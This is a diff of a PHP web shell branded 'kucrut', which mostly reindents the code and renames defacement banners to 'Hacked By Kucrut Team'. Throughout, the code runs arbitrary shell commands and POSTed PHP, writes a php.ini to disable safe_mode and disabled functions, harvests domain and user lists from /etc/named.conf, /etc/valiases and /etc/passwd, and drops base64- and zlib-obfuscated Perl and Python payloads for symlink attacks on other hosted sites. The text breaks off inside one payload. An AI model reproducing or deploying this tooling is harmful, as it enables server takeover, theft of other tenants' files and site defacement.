-		kucrutEx("mv '".addslashes($filepath)."' '".addslashes($_POST["kucrut1"])."';rm -f '".addslashes($filepath)."'");
-	}
+    $rname = $kucrut1_decoded;
+    $randname = $rname.rand(111,9999);
+    $filepath = dirname($_SERVER["SCRIPT_FILENAME"])."/".$randname;
+    if($fp = @__write_file($filepath ,$_POST['kucrut3'])){
+        kucrutEx("mv '".addslashes($filepath)."' '".addslashes($_POST["kucrut1"])."';rm -f '".addslashes($filepath)."'");
+    }
 }
 if($fp){
 echo 'Saved!<br>';
@@ -3413,13 +3413,13 @@ case 'delete':
 if(@is_writable($_POST['kucrut1'])||$GLOBALS["glob_chdir_false"]){
 $deleted = true;
 if(!@unlink($_POST['kucrut1'])){
-	$deleted = false;
-	if($kucrut_canruncmd){
-		if(_kucrut_is_writable($_POST['kucrut1'])){
-			kucrutEx("rm -f '".addslashes($_POST['kucrut1'])."'");
-			$deleted = true;
-		}
-	}
+    $deleted = false;
+    if($kucrut_canruncmd){
+        if(_kucrut_is_writable($_POST['kucrut1'])){
+            kucrutEx("rm -f '".addslashes($_POST['kucrut1'])."'");
+            $deleted = true;
+        }
+    }
 }
 if($deleted)echo 'File Deleted...<script>var elem = $("'.$_POST['kucrut4'].'").parentNode;elem.parentNode.removeChild(elem);delete editor_files["'.$_POST['kucrut4'].'"];</script>';else echo 'Error...';}
 break;
@@ -3440,9 +3440,9 @@ echo '<font color="#FFFFFF"><b>Can\'t set permissions!</b></font><br><script>doc
 clearstatcache();
 KucrutNum(8,9,10,7,6,5,4,2,1);
 if($chdir_fals){
-	$file_perm = $file_info[5];
+    $file_perm = $file_info[5];
 }else{
-	$file_perm = substr(sprintf('%o', @fileperms($_POST['kucrut1'])),-4);
+    $file_perm = substr(sprintf('%o', @fileperms($_POST['kucrut1'])),-4);
 }
 echo '<script>kucrut3_="";</script><form onsubmit="editor(\''.addslashes($_POST['kucrut1']).'\',\''.$_POST['kucrut2'].'\',this.chmod.value,\''.$_POST['c'].'\',\''.$_POST['kucrut4'].'\',\''.$ftype.'\');return false;"><input type="text" name="chmod" value="'.$file_perm.'"><input type=submit value=" "></form>';
 break;
@@ -3499,8 +3499,8 @@ $time = strtotime($_POST['kucrut3']);
 if($time){
 $touched = false;
 if($chdir_fals&&$kucrut_canruncmd){
-	kucrutEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['kucrut3']))."' '".addslashes($kucrut1_decoded)."'");
-	$touched = true;
+    kucrutEx("cd '".addslashes($_POST["c"])."';touch -d '".htmlspecialchars(addslashes($_POST['kucrut3']))."' '".addslashes($kucrut1_decoded)."'");
+    $touched = true;
 }
 if(!@touch($_POST['kucrut1'],$time,$time)&&!$touched)
 echo 'Fail!';
@@ -3520,12 +3520,12 @@ if(is_array($image_info)||$chdir_fals){
 $width = (int)$image_info[0];
 $height = (int)$image_info[1];
 if($chdir_fals&&$kucrut_canruncmd){
-	$source = kucrutEx("cat '".addslashes($file)."' | base64");
-	list($width, $height) = explode(":", kucrutEx("identify -format '%w:%h' '".addslashes($file)."'"));
-	$mime = explode(":", kucrutEx("file --mime-type '".addslashes($file)."'"));
-	$image_info['mime'] = $mime[1];
+    $source = kucrutEx("cat '".addslashes($file)."' | base64");
+    list($width, $height) = explode(":", kucrutEx("identify -format '%w:%h' '".addslashes($file)."'"));
+    $mime = explode(":", kucrutEx("file --mime-type '".addslashes($file)."'"));
+    $image_info['mime'] = $mime[1];
 }else{
-	$source = __ZW5jb2Rlcg(__read_file($file, false));
+    $source = __ZW5jb2Rlcg(__read_file($file, false));
 }
 $image_info_h = "Image type = <span>[</span> ".$image_info['mime']." <span>]</span><br>Image Size = <span>[ </span>".$width." x ".$height."<span> ]</span><br>";
 if($width > 800){$width = 800;}
@@ -3560,30 +3560,30 @@ ob_start("ob_gzhandler", 4096);
 header("Content-Disposition: attachment; filename=\"".addslashes($basename)."\"");
 header("Content-Type: application/octet-stream");
 if($GLOBALS["glob_chdir_false"]){
-	$randname = $basename.rand(111,9999);
-	$scriptpath = dirname($_SERVER["SCRIPT_FILENAME"]);
-	$filepath = $scriptpath."/".$randname;
-	if(_kucrut_is_writable($scriptpath)){
-		kucrutEx("cp '".addslashes($_POST["file"])."' '".addslashes($filepath)."'");
-		readfile($filepath);
-		@unlink($filepath);
-	}else{
-		kucrutEx("cat '".addslashes($_POST["file"])."'");
-	}
+    $randname = $basename.rand(111,9999);
+    $scriptpath = dirname($_SERVER["SCRIPT_FILENAME"]);
+    $filepath = $scriptpath."/".$randname;
+    if(_kucrut_is_writable($scriptpath)){
+        kucrutEx("cp '".addslashes($_POST["file"])."' '".addslashes($filepath)."'");
+        readfile($filepath);
+        @unlink($filepath);
+    }else{
+        kucrutEx("cat '".addslashes($_POST["file"])."'");
+    }
 }else{
-	readfile($_POST['file']);
+    readfile($_POST['file']);
 }
 }else echo('Error...!');}}
 function __kucrut_set_cookie($key, $value){
-	$_COOKIE[$key] = $value;
-	@setcookie($key, $value, time()+(86400 * 7), '/');
+    $_COOKIE[$key] = $value;
+    @setcookie($key, $value, time()+(86400 * 7), '/');
 }
 function kucrutphpeval(){
 if(isset($_COOKIE["eval_tmpdir"])&&@is_dir($_COOKIE["eval_tmpdir"])){
-	$tempdir = __ZGVjb2Rlcg($_COOKIE["eval_tmpdir"]);
+    $tempdir = __ZGVjb2Rlcg($_COOKIE["eval_tmpdir"]);
 }else{
-	$tempdir = dirname(kucrutEx("mktemp"));
-	__kucrut_set_cookie("eval_tmpdir", __ZW5jb2Rlcg($tempdir));
+    $tempdir = dirname(kucrutEx("mktemp"));
+    __kucrut_set_cookie("eval_tmpdir", __ZW5jb2Rlcg($tempdir));
 }
 kucruthead();
 if(isset($_POST['kucrut2']) && ($_POST['kucrut2'] == 'ini')){
@@ -3632,13 +3632,13 @@ ob_start();
 eval('?>'.$_POST['kucrut1']);
 $result = htmlspecialchars(ob_get_clean());
 }elseif(_kucrut_can_runCommand()&&$GLOBALS["sys"]=="unix"){
-	$lang = $_POST['kucrut3'];
-	$filename = "temp".rand(11111,99999);
-	$temp = $tempdir."/".$filename ;
-	__write_file($filename, $_POST['kucrut1']);
-	$result = kucrutEx("mv {$filename} {$temp};{$lang} {$temp};rm -f {$temp}");
-	@unlink($filename);
-	@unlink($temp);
+    $lang = $_POST['kucrut3'];
+    $filename = "temp".rand(11111,99999);
+    $temp = $tempdir."/".$filename ;
+    __write_file($filename, $_POST['kucrut1']);
+    $result = kucrutEx("mv {$filename} {$temp};{$lang} {$temp};rm -f {$temp}");
+    @unlink($filename);
+    @unlink($temp);
 }
 echo '<textarea class="bigarea">'.$result.'</textarea>';
 }
@@ -3751,7 +3751,7 @@ $table = array('td1' =>
 );
 create_table($table);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
-<textarea name=index rows='19' cols='103'><title>Hacked By Tobrut Style</title><b>Hacked By Tobrut Style</b></textarea><br>
+<textarea name=index rows='19' cols='103'><title>Hacked By Kucrut Team</title><b>Hacked By Kucrut Team</b></textarea><br>
 <input type='submit' value=' '>
 </form></center></center>";
 if(isset($_POST['kucrut6'])){
@@ -3808,7 +3808,7 @@ $table = array('td1' =>
 );
 create_table($table);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
-<textarea name='index' rows='19' cols='103'><title>Hacked By Tobrut Style</title><b>Hacked By Tobrut Style</b></textarea><br>
+<textarea name='index' rows='19' cols='103'><title>Hacked By Kucrut Team</title><b>Hacked By Kucrut Team</b></textarea><br>
 <input type='submit' value=' '></form></center></center>";
 if($_POST['kucrut8']=='>>'){
 $s0levisible="Powered By Solevisible";
@@ -3852,7 +3852,7 @@ $table = array('td1' =>
 create_table($table);
 echo "<br><div class='txtfont'>| Your Index |</div><br>
 <textarea name=mybbindex rows='19' cols='103'>
-<title>Hacked By Tobrut Style</title><b>Hacked By Tobrut Style</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
+<title>Hacked By Kucrut Team</title><b>Hacked By Kucrut Team</b></textarea><p><input type='submit' value='' ></p></form></center></center>";
 if(isset($_POST['kucrut6'])){
 $mybb_dbh = $_POST['kucrut6'];
 $mybb_dbu = $_POST['kucrut7'];
@@ -3946,13 +3946,13 @@ $site = trim($_POST['kucrut7']);
 $rep = str_replace(array("https://","http://","www."),"",$site);
 $user = "";
 if(function_exists("posix_getpwuid") && function_exists("fileowner")){
-	if($user = @posix_getpwuid(@fileowner("/etc/valiases/{$rep}"))){
-		$user = $user['name'];
-	}
+    if($user = @posix_getpwuid(@fileowner("/etc/valiases/{$rep}"))){
+        $user = $user['name'];
+    }
 }else{
-	if(_kucrut_can_runCommand(true,true)){
-		$user = kucrutEx("stat -c '%U' /etc/valiases/".$rep);
-	}
+    if(_kucrut_can_runCommand(true,true)){
+        $user = kucrutEx("stat -c '%U' /etc/valiases/".$rep);
+    }
 }
 if(!empty($user)&&$user!='root'){
 echo __pre()."<center><table border='1'><tr><td><b><font color=\"#FFFFFF\">User: </b></font></td><td><b><font color=\"#FF0000\">{$user}</font></b></td></tr><tr><td><b><font color=\"#FFFFFF\">site: </b></font></td><td><b><font color=\"#FF0000\">{$rep}</font></b></td></tr></table></center>";
@@ -3997,7 +3997,7 @@ if(!empty($_POST['kucrut2']) && isset($_POST['kucrut2'])){
 echo '<center><b><big>htaccess for Apache created...!</center></b></big>';
 }
 if(!empty($_POST['kucrut1'])&& isset($_POST['kucrut1'])){
-@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By Tobrut Style(Kucrut)");
+@__write_file($GLOBALS['cwd']."php.ini","safe_mode=OFF\ndisable_functions=ByPassed By Kucrut Team(Kucrut)");
 echo '<center><b><big> php.ini created...!</center></b></big>';
 }
 if(!empty($_POST['kucrut3']) && isset($_POST['kucrut3'])){
@@ -4567,39 +4567,39 @@ echo "</div>";
 kucrutfooter();
 }
 function kucrutMakePwd(){
-	if(_kucrut_file_exists("/etc/virtual/domainowners")||(_kucrut_file_exists("/etc/named.conf")&&_kucrut_file_exists("/etc/valiases"))){
-		return "/home/{user}/public_html/";
-	}
-	$document = explode("/", $_SERVER["DOCUMENT_ROOT"]);
-	$public = end($document);
-	array_pop($document);
-	array_pop($document);
-	$path = implode("/", $document) . "/{user}/" . $public;
-	return $path;
+    if(_kucrut_file_exists("/etc/virtual/domainowners")||(_kucrut_file_exists("/etc/named.conf")&&_kucrut_file_exists("/etc/valiases"))){
+        return "/home/{user}/public_html/";
+    }
+    $document = explode("/", $_SERVER["DOCUMENT_ROOT"]);
+    $public = end($document);
+    array_pop($document);
+    array_pop($document);
+    $path = implode("/", $document) . "/{user}/" . $public;
+    return $path;
 }
 function kucrutGetDomains($state = false){
-	$state = "named.conf";
-	$lines = array();
-	$lines = _kucrut_file('/etc/named.conf');
-	if(!$lines){
-		$lines = @scandir("/etc/valiases/");
-		$state = "valiases";
-		if(!$lines){
-			$lines = @scandir("/var/named");
-			$state = "named";
-			if(!$lines && $state){
-				$lines = _kucrut_file('/etc/passwd');
-				$state = "passwd";
-			}
-		}
-	}
-	return array("lines" => $lines, "state" => $state);
+    $state = "named.conf";
+    $lines = array();
+    $lines = _kucrut_file('/etc/named.conf');
+    if(!$lines){
+        $lines = @scandir("/etc/valiases/");
+        $state = "valiases";
+        if(!$lines){
+            $lines = @scandir("/var/named");
+            $state = "named";
+            if(!$lines && $state){
+                $lines = _kucrut_file('/etc/passwd');
+                $state = "passwd";
+            }
+        }
+    }
+    return array("lines" => $lines, "state" => $state);
 }
 function kucrutCreateParentFolder(){
-	$parent = $GLOBALS['home_cwd'] . "/" . __HOST_DATA_FOLDER__;
-	if(!@is_dir($parent)){
-		@mkdir($parent, 0755, true);
-	}
+    $parent = $GLOBALS['home_cwd'] . "/" . __HOST_DATA_FOLDER__;
+    if(!@is_dir($parent)){
+        @mkdir($parent, 0755, true);
+    }
 }
 function kucrutsymlink(){
 kucruthead();
@@ -4608,29 +4608,29 @@ kucrutCreateParentFolder();
 @chdir($GLOBALS['home_cwd'] . "/" . __HOST_DATA_FOLDER__);
 echo '<div class=header><br><center><div class="txtfont_header">| Symlink |</div><center><h3><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'symphp\')">| Symlink( php ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'symperl\')">| Symlink( perl ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,\'sympy\')">| Symlink( python ) | </a><a href=javascript:void(0) onclick="g(\'symlink\',null,null,null,null,\'SymFile\')">| File Symlink | </a></h3></center>';
 if(isset($_POST['kucrut2'])&&($_POST['kucrut2']=='symperl'||$_POST["kucrut2"]=="sympy")){
-	$sympath = kucrutMakePwd();
-	@mkdir('cgikucrut',0755);
-	@chdir('cgikucrut');
-	kucrutcgihtaccess('cgi');
-	$perl = '#!/usr/bin/perl   -I/usr/local/bandmin'."\n".'use MIME::Base64;use Compress::Zlib;my $kucrut_data="'.__HOST_DATA_FOLDER__.'";eval(Compress::Zlib::memGunzip(decode_base64("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")));';
-	$py = '#!/usr/bin/python'."\nimport zlib, base64\nkucrut_data='".__HOST_DATA_FOLDER__."'\n".'eval(compile(zlib.decompress(base64.b64decode("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")),\'<string>\',\'exec\'))';
-	$cginame = "symperl.kucrut";
-	$source = $perl;
-	$lang = "perl";
-	if($_POST["kucrut2"]=="sympy"){
-		$cginame = "pysymlink.kucrut";
-		$source = $py;
-		$lang = "python";
-	}
-	@__write_file($cginame,$source);
-	@chmod($cginame,0755);
-	echo __pre();
-	$resource = kucrutEx("{$lang} {$cginame} {$sympath}",false,true,true);
-	if(strlen($resource) == 0){
-		echo KucrutiFrameCreator('cgikucrut/'.$cginame);
-	}else{
-		echo $resource;
-	}
+    $sympath = kucrutMakePwd();
+    @mkdir('cgikucrut',0755);
+    @chdir('cgikucrut');
+    kucrutcgihtaccess('cgi');
+    $perl = '#!/usr/bin/perl   -I/usr/local/bandmin'."\n".'use MIME::Base64;use Compress::Zlib;my $kucrut_data="'.__HOST_DATA_FOLDER__.'";eval(Compress::Zlib::memGunzip(decode_base64("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")));';
+    $py = '#!/usr/bin/python'."\nimport zlib, base64\nkucrut_data='".__HOST_DATA_FOLDER__."'\n".'eval(compile(zlib.decompress(base64.b64decode("eJydWN1z4jgSfzZ/hdZTWcOG2JC6vQdC2MrNTO6manfn6ib7lFAuYQvwjrFckgiwU3N/+3XrwxbgZKbOD1iW+lvdP7VQ4jDpEXiKTc2FItmqUAs9oUcxq+iiZP1Bj+0zVqtJL6iplL2eJVfFhrkxl24kD81QNMv1Lu/1ViVf0DKFMbklYei+t6I03x8+pW//+QHG97SUrKecdUd8ID6mYvX8OJ77i0aIVKJPyyVNc6rogFySMAFPcCYJGyeQq1H1ILas18vZkqyYQhX9mssBeFosGyJrEEwGgqmtqDyLNCGwIFWYF4JlKiRckD6XcU3VOi7ksoAYhglTWVLRDcvjjFfLcEBolZOWCngt0TMtCyqZTMLBwNMZJmu+YcmXrWTia1JvF2WRpWu1KcG1ALjBBBTHqudC8OoxfPfx7R+/vf/9If3Px48P4TyWdVkoUBEOYBs1NzAgX1zzGvY48MdO54V0Ci9kSC4I8sd/8qLqI/VgSIykgQnhhn5msAMZ31ZqSHK+oUU1JMg/JNkuR2/WStW42/ieJEl4iVtmKAc6lmasw/n4Cz7zEINg+aI/6TOVmShgI2nJBDi0YySjlSLLAuJpuOM4DgcRuCkKWAinSkBmHEp2Gym2V1cQ31U1yVilmLiJZlOVz6ZLDpQZL7m4jd7cwzMaRzNjnXZncBlOEySaTROkV3mHyJItFQqkZC3Y8jYy/Gg6sEdEQd4ydRuli5JWn6MTpaPR3fX1yCm1IfG00kZzh7X3944Ro31u7KlNbdUALdaHPGzKovqc